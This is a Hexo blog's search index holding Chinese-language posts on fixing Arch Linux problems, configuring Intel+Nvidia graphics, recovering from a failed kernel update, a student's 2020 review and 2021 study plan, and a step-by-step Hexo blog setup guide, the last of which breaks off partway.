<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Arch使用过程遇到的问题记录</title>
      <link href="2021/04/29/arch-shi-yong-guo-cheng-yu-dao-de-wen-ti-ji-lu/"/>
      <url>2021/04/29/arch-shi-yong-guo-cheng-yu-dao-de-wen-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="zip解压中文乱码"><a href="#zip解压中文乱码" class="headerlink" title="zip解压中文乱码"></a>zip解压中文乱码</h2><p><strong>问题介绍</strong>：使用ark打开或解压从windows系统拷贝的zip格式的压缩包，中文显示乱码。使用7zip则无法解压。</p><p><strong>问题原因</strong>：Windows默认使用GB2312编码，Linux则默认UTF-8，Ark中用于zip打开和解压的插件不支持GB2312。</p><p><strong>解决时间</strong>：2021.04.29</p><p><strong>解决方法</strong>：使用pacman安装p7zip-natspec。打开Ark，设置–&gt;配置–&gt;插件，禁用Libzip插件，启用p7zip插件。</p><h2 id="screenfetch内存显示错误"><a href="#screenfetch内存显示错误" class="headerlink" title="screenfetch内存显示错误"></a>screenfetch内存显示错误</h2><p><strong>问题介绍</strong>：使用screenfetch查看系统信息时，最后一行的内存显示错误，且开头提示<code>/usr/bin/screenfetch:行1802: 2308870144-：语法错误: 需要操作数 (错误符号是 "-")</code>。</p><p><strong>问题原因</strong>：打开<code>/usr/bin/screenfetch</code>，跳转到1802行查看相关代码，发现在1801行运行了一句命令<code>free -b | awk 'NR==2{print $2"-"$7}'</code>，自己手动在命令行运行该命令和<code>free -b</code>命令比较结果，发现命令中的‘$7’为空，应该为‘$1’-‘$6’，同时去掉前面的“内存：”字符串。</p><p><strong>解决时间</strong>：2021.05.06</p><p><strong>解决方法</strong>：将<code>‘$2’-‘$7’</code>改为<code>‘$1’-'$6'</code>，同时使用sed命令去掉前面的字符串。修改后的1801行为<code>mem=$(free -b | awk 'NR==2{print $1"-"$6}' | sed 's/内存：//g' )</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/2021-05-06_21-41.png" alt="修改后的代码片段"></p><h2 id="qv2ray启动报错"><a href="#qv2ray启动报错" class="headerlink" title="qv2ray启动报错"></a>qv2ray启动报错</h2><p><strong>问题介绍</strong>：当我日常<code>sudo pacman -Syu</code>并在第二次开机时，突然发现本来应该开机自动启动的qv2ray不见了，在程序启动器中点了两次均没有反应，在终端中启动，报错：<code>qv2ray: error while loading shared libraries: libprotobuf.so.26: cannot open shared object file: No such file or directory</code>。</p><p><strong>问题原因</strong>：应该是我在更新时更新了qv2ray或者protobuf（具体时哪个我没注意到），导致两者出现了不兼容的情况。</p><p><strong>解决时间</strong>：2021.05.11</p><p><strong>解决方法</strong>：使用预览版qv2ray<span class="github-emoji"><span>🐶</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f436.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>：<code>yay -S qv2ray-dev-git</code>。</p>]]></content>
      
      
      <categories>
          
          <category> Arch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arch双显卡配置(Intel+Nvidia)</title>
      <link href="2021/04/20/arch-shuang-xian-qia-pei-zhi-intel-nvidia/"/>
      <url>2021/04/20/arch-shuang-xian-qia-pei-zhi-intel-nvidia/</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h1><p>再次没有忍住linux带给我的诱惑，抛弃了windows，安装了心心念念的arch。尽管不是第一次在实体机上安装了，但安装过程并不顺利。先是安装完成后找不到启动盘，这个我也没有细查原因，可能是因为我的机械硬盘没有格式化（？），反正我讲机械硬盘也一起格式化为ext4格式后就可以了。之后，又出现了显卡问题：我想要启动设置为启动3D图像加速的windows虚拟机，结果显示不出画面，提示硬件太差。我知道此时使用的是Intel核芯显卡，如果使用Nvidia独显应该就不会出现这类问题了。</p><p>我参考Arch Wiki上面的相关条目（可能会产生性能问题的方案我没有使用），但是没有成功，反而造成了无法开机。幸好启动盘还在，通过启动盘挂载硬盘后将之前的修改回退了。折腾了一下午，我已经想要放弃了。在去食堂吃饭的时候，无意中看到了B站一个人的视频，突然大手启发，回去后一鼓作气搞定了。</p><p>经过了一天的使用，没有发现什么问题，特此整理记录，方便后来者以及自己以后重现。</p><h1 id="2-我的显卡"><a href="#2-我的显卡" class="headerlink" title="2 我的显卡"></a>2 我的显卡</h1><p>我的笔记本是戴尔G3，核芯显卡Intel UHD 630，独立显卡GeForce GTX 1050 Ti。</p><h1 id="3-配置过程"><a href="#3-配置过程" class="headerlink" title="3 配置过程"></a>3 配置过程</h1><h2 id="3-1-Intel"><a href="#3-1-Intel" class="headerlink" title="3.1 Intel"></a>3.1 Intel</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S mesa lib32-mesa vulkan-intel lib32-vulkan-intel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不推荐使用xf86-video-intel，只要使用xorg的modesetting驱动（也就是什么都不装）就可以了。</p><p>另外，上面安装的vulkan只有Intel UHD 400及以上的核显才支持。</p><h2 id="3-2-Nvidia"><a href="#3-2-Nvidia" class="headerlink" title="3.2 Nvidia"></a>3.2 Nvidia</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S nvidia nvidia-settings lib32-nvidia-utils<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面是我安装的包，如果你的显卡是GeForce 630到GeForce 400的版本，按照以下命令安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S nvidia-390xx-dkms nvidia-settings lib32-nvidia-390xx-utils<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再老的显卡：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S mesa lib32-mesa xf86-video-nouveau<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-3-双显卡配置"><a href="#3-3-双显卡配置" class="headerlink" title="3.3 双显卡配置"></a>3.3 双显卡配置</h2><p>我采用的方案是<a target="_blank" rel="noopener" href="https://github.com/Askannz/optimus-manager/wiki">optimus-manager</a>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S optimus-manager optimus-manager-qt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完成后重启即可使用。如果没有设置为开机启动就设置一下，一般自动就设置了。</p><p>现在应该就可以自由切换显卡了，总共有三个模式：Intel模式，Nvidia模式和Hybrid模式。Hybrid模式和Windows下比较类似，平时会使用核显，需要的时候才会使用独显。</p><p>然后安装nvidia-prime：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S nvidia-prime<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其他可能会有教程让你添加什么环境变量，不需要添加的，<strong>我添加了就无法开机</strong>。</p><p>每次切换显卡模式都会注销当前帐号，这点要注意一下。在optimus的设置里面也可以设置开机默认使用的模式，我选择的Hybrid，这样就不用开机后再进行设置了。</p><p>如果遇到了什么问题，去上面给出的optimus-manager官方文档里面找，我暂时还没遇到问题。</p>]]></content>
      
      
      <categories>
          
          <category> Arch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录archlinux第一次滚挂并解决</title>
      <link href="2021/03/09/ji-lu-archlinux-di-yi-ci-gun-gua/"/>
      <url>2021/03/09/ji-lu-archlinux-di-yi-ci-gun-gua/</url>
      
        <content type="html"><![CDATA[<p>用arch没有多久，但是遇到的问题可真不少，但是在解决这些问题的过程中也确确实实了解到了许多东西。最开始是直接在自己的笔记本上装arch，后来发现目前对于腾讯系软件依赖还是太大，wine虽然可以用，但效果确实不太好，尤其是腾讯会议，基本没法用。后来装了双系统，win10+arch，又觉得总是重启挺麻烦的，干脆又回到了最初的起点…还是在vmware上装arch实在一些。</p><p>今天，2021年3月9日，我第一次遇到了滚动更新挂掉了的情况，稍微记录一下吧。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/image-20210309232544987.png" alt="报错信息"></p><p>这次滚动更新，升级linux内核到了5.11.4.arch1-1，结果我重启后提示上面的东西。</p><pre class="line-numbers language-none"><code class="language-none">Loading Linux linux ...error: file '/boot/vmlinuz-linux' not found.loading initial ramdisk ...error: you need to load the kernel first.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>首先，我看到<code>vmlinuz</code>，还以为是和vmware出现了不兼容问题，顿时觉得人生无望…短暂失神后，我先去了Archlinux Wiki中在vmware上安装客户机词条下面，没有找到相关的错误。然后去了Archlinux中文论坛，想着应该还会有人遇到这样的错误，结果还是一无所获。不得已，开始百度。一百度还真找到了！</p><p>在grub界面下按<code>c</code>进入grub命令行模式，然后输入<code>ls</code>查看所有硬盘分区，选择比较长的那个，<code>ls (hd0,xxxx)</code>查看，如果输出是根分区<code>/</code>了，那就找对了。然后输入<code>cat (hd0,xxxx)/etc/fstab</code>，还记得fstab这个文件吗？它保存了磁盘的挂载信息，可以让你每次开机都会自动挂载分区到对应的磁盘。找到根分区对应的磁盘，记住它。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> <span class="token assign-left variable">root</span><span class="token operator">=</span><span class="token punctuation">(</span>hd0,xxxx<span class="token punctuation">)</span><span class="token builtin class-name">set</span> <span class="token assign-left variable">prefix</span><span class="token operator">=</span><span class="token punctuation">(</span>hd0,xxxx<span class="token punctuation">)</span>/boot/grublinux /boot/vmlinuz-linux <span class="token assign-left variable">root</span><span class="token operator">=</span>/dev/sda1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在输入上面第三条命令时，我这里报错了，说是未找到<code>vmlinuz-linux</code>。按理说，如果分区找对了的话，是不会出现这样的提示的。我又检查了一下，确定前面的都没有错（也不可能找错分区，我这里就两个，另外一个特别特别小，忘记是干什么的了…）。</p><p>到这里，导致报错的原因十分明显了：<strong>vmlinuz-linux这个文件在更新后因为某些缘故被删除了</strong>。并不是挂载出现了问题，而是更新删除了一个文件。</p><p>于是，我抱着试试的态度，恢复了最近的一次快照，再次进行了滚动更新，更新后重启，依旧是这样。看来可以排除是下载过程出现错误了。</p><p>既然滚动更新总是出错，那我干脆就自己再下载一遍linux内核好了。于是，我再次恢复快照、滚动更新，更新完成后，输入<code>sudo pacman -S linux</code>，等待下载完成后重启，哈哈，大功告成！</p><p>这个错误之后可能还会遇见，虽然现在看起来特别低级，但毕竟是第一次遇到滚挂的情况，也是第一次在尝试教程无果后，靠自己去解决linux上的问题，还是挺有纪念意义的！</p>]]></content>
      
      
      <categories>
          
          <category> Arch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恰醋的2020总结 &amp;&amp; 2021规划</title>
      <link href="2021/02/15/qia-cu-de-2020-zong-jie-2021-gui-hua/"/>
      <url>2021/02/15/qia-cu-de-2020-zong-jie-2021-gui-hua/</url>
      
        <content type="html"><![CDATA[<p>梦一样的2020在日历上就这样被翻过去了，日子真的是越过越快呢。今天已经是农历大年初五了，该串的亲戚也都串过了，终于可以稍微安宁一段时间，思考一下戏剧般的2020，以及想一想2021我将前往何处…</p><h2 id="2020の回顾"><a href="#2020の回顾" class="headerlink" title="2020の回顾"></a>2020の回顾</h2><ul><li>正月初一：社区没有封闭，带着口罩去伯伯加吃了火锅</li><li>正月初五左右：社区宣布封闭</li><li>正月初十左右：我在的社区已经全部封死了，路都给堵上了</li></ul><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/Img_20210215222823.jpg" alt="封路"></p><ul><li>正月十九：爸爸生日，难得可以在家一起给爸爸过生日。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/Img_20210215222748.jpg" alt="给爸爸过生日"></p><ul><li><p>忘了中间哪一天：开始线上教学，用的都是腾讯课堂</p></li><li><p>正月二十五左右：我在的城市宣布降级为低风险地区，内部解封了</p></li><li><p>正月二十九：时隔多年，终于在家过了一次生日，吃了鸡煲</p></li><li><p>开始关注微博，开始关注那些因为疫情而出来大肆侮辱中国、赞扬欧美的公知，一度对我国感到绝望。不过几天就调整过来了，如果真的有完美的国度，那也只能是天国。当时我除了一些极端造谣的能识别出来，其他的竟然认为有一部分是真的…但后来不知道什么时候风向就变了，应该是方方活跃的时候。我开始意识到从小看到大的意林、读者等杂志，可能真的是毒鸡汤，尽管这些鸡汤曾经让我反思“我不能像文中的那些中国小孩儿一样”。嘛…让成长阶段的我反思并不断朝着更好的方向发展，可能我还要感谢这些毒鸡汤和公知编造的谎言？</p></li><li><p>对微博的关注来得快，去得也快，大概也就一个月吧，就懒得再去看了，微博最终没能躲过和其他APP一样的命运：吃饭时瞥一眼的工具。</p></li><li><p>三月（阳历，后面都是）：有风向说五一可能开学，心情有些复杂。脚上的趾疣终于好了，从高二开始就有，高三开始治疗，陆陆续续快三年了，做了不知道多少次液氮冷冻，受了几十次苦，可是都没治好。年前找了一个民间高手，只花了一千，受了五六次皮肉之苦，就完全治好了。民间有高人。</p></li><li><p>四月：果然还是没办法开学，网课还在继续，有一些课程也结课了。我对网课的兴奋度也由高减低，甚至被惰性夷为了平地，又找蓝翔小哥开着挖掘机挖出了大峡谷。总之就是很颓废。也没有考试刺激刺激我，课都懒得听了。</p></li><li><p>五月：发了正式通知，本学期不开学，考试全部是返校后进行，我也在尽力拜托自己的惰性，好好学习。</p></li><li><p>六月：百年校庆，参加了团队马拉松，一人十公里。</p></li><li><p>六月：教务处挨骂了。因为之前通知返校后再考试，可本部突然违背大多数学生和老师的意愿，执意线上考试，我们校区也突然宣布“一校三区，统一规格”（本部有好事的时候从来不会说这个，有什么坏事一定会带上这句话）。所有人都很懵，因为马上就要考试了，还不知道考试时间、考试形式、公平性保障等等，连复习哪一门都不知道。</p></li><li><p>学院给开了线上考试动员会，果不其然，教务处的老师怕挨骂，一上来就要求我们必须实名，否则直接禁言，评论区也只能阴阳怪气恶心教务处。会议说要解答我们的疑惑，可是对于我们提出的问题，回答基本都是“等学校通知”“目前还不确定”等模糊回答。终于，他们对考试途中断网的处理方法有了预备方案——五分钟内回来就可以。评论区缓慢而有序地冒出了一大群可爱的小问号。最讽刺的是，在讲这个问题时，老师那边网络卡了，评论区基本都是“五分钟快到了老师”“老师在抄答案呢，别吵吵”等等，笑死。最后一个学生提了一些我们真正想提的问题，也没有过激语言，老师试图辩解，却被提问的人和评论区反驳了回来，就直接让他下麦了…下麦了…麦了…了…反正就是一个激起了我们愤怒的会议。</p></li><li><p>六月十五左右：给出了考试安排表，接受了现实的我们开始安排复习了。</p></li><li><p>六月和七月基本都是每天从早学到晚，和高中差不多，毕竟一学期好多东西都不会，又不知道考试难度…不过真到了考试的时候却发现，试题好简单！中间还做了两个课设，EDA和数据库的。数据库课设是在考试期间做的，在最难的一门之后。所以，两周的课设，我最后只用了一天半就完成了，验收也十分顺利，最后得了九十多分。嘿嘿。</p></li><li><p>在考试的后期，已经很疲惫了，经常不想学，想玩，尤其是信息论的时候，感觉什么都没复习进去。这门课也成了这学期分数最低的一门专业课。</p></li><li><p>六月二十七：完成了所有的考试和作业，暑假正式开始。</p></li><li><p>和子博学长联系了，开始做漏洞复现的工作。第一个就是dll劫持。那时候一点也不懂，感觉好难好深奥，可是真动手做了，慢慢的也能做出来，而且随着做的漏洞越来越多，对漏洞的理解也越来越深刻了，做起这些复现工作也越来越轻车熟路。</p></li><li><p>我也慢慢爱上了和漏洞有关的东西，想要以后研究生阶段研究这个方向。</p></li><li><p>成绩出来，学分绩90，7/32，上大学以来最高的一次了。我还以为大家都是九十多分，谁知道成绩分布还是那个样子，七十多六十多的好多。</p></li><li><p>也拿到了三等奖学金。</p></li><li><p>九月十四：终于开学了。</p></li><li><p>下学期就那样吧，和之前在学校度过的一天天一样，寝室、教室、实验室，三个地方来回跑。也开始旷课——自己不喜欢的课（在此点一下某全栈工程师、中国懂王，真烦他），那门课4.5学分，最高的一门专业课，最后成绩也特别差，73，导致我最后的学分绩只有79.1，加上其他的一些分数，最后综合素质评分应该也就80吧。</p></li><li><p>在实验室做的工作也开始多了起来，成为了我们组的核心成员之一。基本也还都是漏洞复现。我不明白为什么博士跟我们开会的时候说如果做烦了，可以找他换一下工作，这东西完全做不烦的好吧！！！我觉得好有意思地说！</p></li><li><p>寒假也开始准备考研了，没有理想院校，我只是一只漫无目的只会嘎嘎叫的丑小鸭呜呜呜</p></li><li><p>而且到现在还没怎么学…</p></li><li><p>而且实验室的工作也已经暂时辞掉了…</p></li></ul><h2 id="2021の规划"><a href="#2021の规划" class="headerlink" title="2021の规划"></a>2021の规划</h2><ul><li>今年最重要的任务肯定就是考研了，到现在为止目标院校还没确定，真的难</li><li>我想，五月份要结束数学一轮，然后英语最晚五月要背完单词，开始做真题</li><li>六月也要开始专业课的复习，不过到时候可能也会忙着期末考试和课设，能复习的有限</li><li>七月份小学期，应该就比较清闲了，看看有没有创新课，如果顺利的话到时候只剩下一分了，修一门就可以了。到时候要全马力复习专业课</li><li>政治我打算等大四开学再开始准备，听说好好背就可以了，十月开始应该也可以</li><li>新的一年，要慢慢规范作息，放假在家，每天两三点睡觉，九点多才醒，十点多甚至十一点起床，作息完全乱了，真的没有上午了<span class="github-emoji"><span>😢</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></li><li>作息最重要！！！！！！！！！！！！！！</li><li>然后就是学习要跟上，不要搞太多花里胡哨的，实验室也暂时退了，没那么多杂七杂八的东西，专心复习就好</li><li>等开学后，就要成为图书馆常客了，每天在图书馆复习，要找一个固定的座位（最好旁边是pljj）（不是</li><li>然后就是，试着多说话（？）毕竟我话太少了</li><li>等12月份考完，就再回实验室，白嫖毕设（呸！）</li><li>还有就是要减肥！上学期从140减到了132，放假疯狂吃竟然也没怎么胖，我的理想体重是120，一年时间应该完成不了，因为考研很累的，我一累就要疯狂吃东西…</li><li>别的也想不起来什么了…</li><li>每天定计划？这个可以有（拿出我的Microsoft Todo）</li><li>暂时就这些吧，懒得想了，我不太擅长对很长的一段时间做出具体的规划，尤其是现在决定了考研但是又对这个过程有些迷茫的时候，很难很难做出正确的决定</li></ul><p>最后，希望所有人2021年都会幸福啊！</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/45573DD709340A7B05D59F2160D9C1D7.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始搭建你自己的Hexo个人博客</title>
      <link href="2021/02/15/hexo-build-document/"/>
      <url>2021/02/15/hexo-build-document/</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h1><h2 id="1-1-介绍"><a href="#1-1-介绍" class="headerlink" title="1.1 介绍"></a>1.1 介绍</h2><p>本文详细介绍了Hexo的从零开始搭建方法、主题配置、额外功能以及自己发现的一些小技巧等，未来也将不定时<strong>更新</strong>，旨在记录自己的探索过程，同时也希望能够帮到后来接触到Hexo的小伙伴。</p><h2 id="1-2-碎碎念"><a href="#1-2-碎碎念" class="headerlink" title="1.2 碎碎念"></a>1.2 碎碎念</h2><p>前段时间重装了一下电脑，只备份了写过的博客，没有备份原来的配置，就是打算要更换一下主题。听说NextT主题非常火，可我看了下界面，并不是我的菜。经过一番挑选，就在要放弃更换主题、还是用原来的主题时，发现了Matery，各方面都完全符合我的审美（除了一些配色），于是迫不及待开始重新搭建我的Hexo博客——恰醋的小屋。</p><p>这篇博客也是我在本次配置过程中记录的，比之前写过的要详细一些，图片也很多，对于初学者来说应该很容易弄明白。</p><p>不少想要搭建博客的小伙伴可能也都和我一样，没有前端基础（到目前为止，我只学过C/C++和Python，C/C++也好久没写过代码了），所以大家都是跟着文档摸索着前进的，一篇篇文档、博客可能如同指引灯一般，引导着我们一步步满足自己的好奇心。</p><p>希望我的这篇博客也能发出微弱的烛光吧~</p><h1 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2 准备工作"></a>2 准备工作</h1><h2 id="2-1-安装配置node"><a href="#2-1-安装配置node" class="headerlink" title="2.1 安装配置node"></a>2.1 安装配置node</h2><p>前往<a target="_blank" rel="noopener" href="http://nodejs.cn/download/">Node.js官网</a>下载nodejs安装包，不推荐下载最新版，因为我这里遇到了错误（但我并不确定是不是版本问题），换成了12.15.0版本的成功了。可以点击下面的阿里云镜像，去阿里云下载12.15.0版本，可以保证成功。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(1).png"></p><p>下载完成后开始安装，整个安装过程默认即可。为了避免之后出现不可预知的麻烦，我在这里选择自动安装需要的工具。如果你也这样选择，那么在nodejs安装完成后，会自动弹出cmd，随便按几个键后会弹出PowerShell，Chocolatey就会自动开始安装。等待一段时间，安装完成。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(2).png"></p><p>在cmd中输入<code>npm -v</code>和<code>node -v</code>以检测安装是否成功。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(3).png"></p><p>之后的博客部署过程中，我们将多次使用npm安装需要的模块，如果你在国内，那么使用默认源可能会比较慢，因此需要修改下载源。我本来打算使用中科大源，但是在几天前由于一些原因，中科大发布公告说无法再正常继续相关镜像的同步工作，只好作罢。现在网上我能找到的都是修改为淘宝源（<code>https://registry.npm.taobao.org</code>），于是也随波逐流了。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 修改源</span><span class="token function">npm</span> config <span class="token builtin class-name">set</span> registry https://registry.npm.taobao.org<span class="token comment"># 验证</span><span class="token function">npm</span> config get registry<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(4).png"></p><h2 id="2-2-安装配置Git"><a href="#2-2-安装配置Git" class="headerlink" title="2.2 安装配置Git"></a>2.2 安装配置Git</h2><p>如果用过github等，或许对这个并不陌生，</p><p>前往<a target="_blank" rel="noopener" href="https://git-scm.com/">git官网</a>下载相应操作系统的最新版本的安装包，我下载的是windows系统下的exe安装包。下载完成后开始安装。这个安装过程每个人可能都不一样，我简单贴一下我更改过的两个选项，未贴出的均为默认。</p><p>选择Git文件默认的编辑器，我选择VS Code，这个其实无所谓的，因为它很少用到，默认Vim也可以。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(5).png"></p><p>配置终端模拟器以与Git Bash一起使用。我这里完全可以使用Windows Terminal，而不使用Git Bash，因此修改了，如果你无法确定，那么就默认选择第一项。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(6).png"></p><p>安装完成后，可以输入<code>git --version</code>验证是否安装成功。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(7).png"></p><h2 id="2-3-安装Hexo博客框架"><a href="#2-3-安装Hexo博客框架" class="headerlink" title="2.3 安装Hexo博客框架"></a>2.3 安装<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a>博客框架</h2><p>在终端输入以下命令安装Hexo博客框架。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 安装hexo框架</span><span class="token function">npm</span> <span class="token function">install</span> hexo-cli -g<span class="token comment"># 验证安装</span>hexo -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(8).png"></p><p>至此，我们的准备工作已经完成，安装了nodejs和git两个工具以及hexo博客框架。</p><h1 id="3-搭建最基础的博客"><a href="#3-搭建最基础的博客" class="headerlink" title="3 搭建最基础的博客"></a>3 搭建最基础的博客</h1><h2 id="3-1-初始化博客"><a href="#3-1-初始化博客" class="headerlink" title="3.1 初始化博客"></a>3.1 初始化博客</h2><p>首先，我们需要一个文件夹来保存自己的博客网站信息，新建一个<strong>空</strong>文件夹，然后在这里打开你想用的任何bash或shell（cmd, Git Bash, PowerShell, Windows Terminal等），输入<code>hexo init</code>进行初始化。初始化完成后，可以看到该文件夹下多出了许多文件。然后输入<code>npm install</code>自动安装一些需要的模块。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(9).png"></p><h2 id="3-2-访问自己的博客"><a href="#3-2-访问自己的博客" class="headerlink" title="3.2 访问自己的博客"></a>3.2 访问自己的博客</h2><p>在初始化完成后，我们就可以使用<code>hexo s</code>或<code>hexo server</code>命令来访问自己的博客了。可以看到，它提示我们Hexo正运行在<a target="_blank" rel="noopener" href="http://localhost:4000/">http://localhost:4000</a>，我们通过浏览器访问该网页，就可以看到初始化的博客了。我就不放图了，留给你们自己去看吧。另外就是，初始会有一篇名为《Hello World》的博客，在这篇博客中可以看到hexo常用的四个命令及其用法。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(10).png"></p><p>一定要记得，此时不要关闭终端，当你访问完成后，先按‘Ctrl+C’结束，然后再退出终端。如果你已经关闭了，那么也不要紧，如果后面遇到了问题，最简单直接的方法就是重启一下电脑。你也可以自行查找如果关闭4000端口。</p><h2 id="3-3-使用不同的主题"><a href="#3-3-使用不同的主题" class="headerlink" title="3.3 使用不同的主题"></a>3.3 使用不同的主题</h2><p>hexo默认的主题为landscape，如果不喜欢该主题，可以自行下载其他的<a target="_blank" rel="noopener" href="https://hexo.io/themes/">主题</a>。每个主题的使用方法都不尽相同，具体的要看主题作者给出的文档，建议新手找那些文档详细且还在更新的主题使用。下载相应的主题后，记得去hexo文件夹下找到_config.yml文件，修改theme参数为你使用的主题名。</p><p>当然，在你对hexo知之甚少的情况下贸然修改主题是会要人命的（Hexo: 气死你气死你气死你，略~​），所以你也可以选择先跳过这一步。</p><p>我最开始使用的主题为<a target="_blank" rel="noopener" href="https://shen-yu.gitee.io/2019/ayer/">Ayer</a>，目前使用的主题为<a target="_blank" rel="noopener" href="https://github.com/blinkfox/hexo-theme-matery/tree/master">matery</a>，这两个主题都给出了十分详细的使用文档。</p><h2 id="3-4-将博客部署到github上"><a href="#3-4-将博客部署到github上" class="headerlink" title="3.4 将博客部署到github上"></a>3.4 将博客部署到github上</h2><p>尽管Github比较慢，但我建议新手还是尝试一下（实际上，就我最近的使用感受而言，github速度95%时间以上都是挺快的），因为Github比国内的Gitee、Coding等平台的都要好，即使你现在为了访问速度使用Gitee或Coding，之后大概率也会转回Github。当然，若你并不打算购买域名，为了提高访问速度还是使用Gitee或Coding吧。</p><h3 id="3-4-1-新建仓库（repository）"><a href="#3-4-1-新建仓库（repository）" class="headerlink" title="3.4.1 新建仓库（repository）"></a>3.4.1 新建仓库（repository）</h3><p>登录自己的Github账号，新建一个仓库,命名为**你的账户名.github.io **(固定格式)。例如：假如你的账户名为 <em>zhangsan</em>，那么respository name就必须为 <strong>zhangsan.github.io</strong>。另外要注意，是账户名而不是昵称！账户名是你申请的时候输入的名字，也是你访问自己Github主页是url最后一级的显示。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(11).png"></p><h3 id="3-4-2-使用Github-Pages"><a href="#3-4-2-使用Github-Pages" class="headerlink" title="3.4.2 使用Github Pages"></a>3.4.2 使用Github Pages</h3><p>新创建一个空项目后，点击Settings。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(12).png"></p><p>然后拉到最下面，可以看到一个Github Pages，点击Choose a theme，随便选择一个主题（反正之后也不会用），然后一路默认直到创建完成，此时你会发现多了一个_config.yml文件，README也发生了变化。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(13).png"></p><h3 id="3-4-3-配置SSH-key"><a href="#3-4-3-配置SSH-key" class="headerlink" title="3.4.3 配置SSH key"></a>3.4.3 配置SSH key</h3><p>要使用git工具首先要配置一下SSH Key。</p><p>如果以前使用过git，那么在“C://User/UserName/.ssh/id_rsa.pub”文件中存储着SSH Key。如果没有，就需要先在本机配置一下github账户。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config --global user.name <span class="token string">"用户名"</span><span class="token function">git</span> config --global user.email <span class="token string">"邮箱地址"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后输入<code>ssh-keygen -t rsa -C "邮箱地址"</code>生成密钥SSH Key，根据提示按三次回车（即全部默认），就可以在id_rsa.pub文件中查看到自己的SSH Key了。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(14).png"></p><p>之后将ssh-key添加到ssh-agent: <code>ssh-add ~/.ssh/id_rsa</code>。</p><p>输入<code>cat ~/.ssh/id_rsa.pub</code>，讲输出复制到剪切板，然后进入github官网，在你的头像下面点击Settings，在左侧栏可以找关键词SSH。点击New SSH key新建一个SSH，名字随便，内容就是你刚才复制的内容。</p><p><img 